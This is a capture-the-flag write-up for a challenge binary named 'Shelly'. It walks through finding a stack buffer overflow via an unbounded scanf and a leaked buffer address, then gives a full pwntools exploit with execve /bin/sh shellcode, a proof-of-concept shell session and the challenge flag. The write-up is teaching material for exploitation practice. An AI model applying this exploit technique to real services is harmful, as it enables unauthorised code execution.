# [__💲Shelly💲__](#)

## Description: 

* You old partner in crime is back in town. Shelly knows a lot and even after all the things you've been through, you kinda need her.. Or does she need you? Anyway, talk to her and plan a bright future together.

## Objective: 

* `Buffer Overflow` and `ret2shellcode` attack.

## Flag: 🏁
* `INSSEC{sh3lly_1s_re4lly_h3lpful!}`

### Difficulty:
* Medium

## Challenge:

The interface looks like this:

```console
Shelly wants to help you get some 💵.
Do you trust her?

[1] Yes, of course!
[2] Of course not!

[You]: 1
Tell her your plan
[You]: rob

[Shelly]: This sounds really good!
We need to hit this first: [0x7ffca581b910]
Do you agree?

[You]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

[Shelly]: That's bad..
[1]    20333 segmentation fault (core dumped)  ./shelly
```

As we can see, there is a `SegFault` after some "A"s. That means there is a possible `Buffer Overflow`.

We run a `checksec` to verify this:

```console
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```

`NX`, `PIE` and `Canary` are disabled, that means we can execute code and perform a buffer overflow if possible.

Let's open a disassembler to analyze the program.

### Disassembly 

We start from `main()`:

```c
undefined8 main(void)

{
  int iVar1;
  char *pcVar2;
  char local_48 [32];
  undefined local_28 [28];
  int local_c;
  
  setup();
  printstr(&DAT_00100c58);
  printstr("\n[1] Yes, of course!\n[2] Of course not!\n");
  printf("\x1b[1;36m");
  printstr("\n[You]: ");
  __isoc99_scanf(&DAT_00100cd2,&local_c);
  if (local_c == 2) {
    printf("\x1b[1;31m");
    printstr("This was not a good choice..\n");
  }
  else {
    if (local_c == 1) {
      printstr("Tell her your plan\n");
      printf("\x1b[1;36m");
      printstr("[You]: ");
      read(0,local_28,10);
      printf("\x1b[1;32m");
      printstr("\n[Shelly]: This sounds really good!\nWe need to hit this first: ");
      printf("[%p]",local_48);
      printstr("\nDo you agree?\n");
      printf("\x1b[1;36m");
      printf("\n[You]: ");
      __isoc99_scanf(&DAT_00100d75,local_48);
      printf("\x1b[1;32m");
      iVar1 = strcmp(local_48,"yes");
      if (iVar1 == 0) {
        pcVar2 = "\n[Shelly]: Good! See you there at 4.20 pm\n";
      }
      else {
        pcVar2 = "\n[Shelly]: That\'s bad..\n";
      }
      printstr(pcVar2);
    }
    else {
      printf("\x1b[1;32m");
      printstr("\n[Shelly]: This was never an option..\n");
    }
  }
  return 0;
}
```

As we can see, we have a leak of the buffer we write (local_48).

We also have an Overflow due to scanf having no limits here.

So, our goal is:

* Save leaked address.
* Fill the buffer with our shellcode and nops and overwrite the return address with our leaked address.

We found form gdb that the return address is after 72 bytes:

```gdb
[+] Found at offset 72 (big-endian search)
```

The final payload looks like this:

```python
payload = sc.ljust(72, b'\x90') + p64(leaked)
```

### Exploit 📜

```python
#!/usr/bin/python3.8
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './shelly' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	sla(':', '1')
	sla(':', 'w3t')
	sc = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
	ru('0x')[:-2]
	leaked = int(ru(']')[:-1],16)
	print('Leaked: 0x{:x}'.format(leaked)) 
	payload = sc.ljust(72, b'\x90') + p64(leaked)
	sla(':', payload)
	inter()

if __name__ == '__main__':
	pwn()
```

### PoC 🏁

```console
[+] Opening connection to 172.17.0.1 on port 1337: Done
Leaked: 0x7fff7c85a410
[*] Switching to interactive mode
 
[Shelly]: That's bad..
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
INSSEC{sh3lly_1s_re4lly_h3lpful!}
```
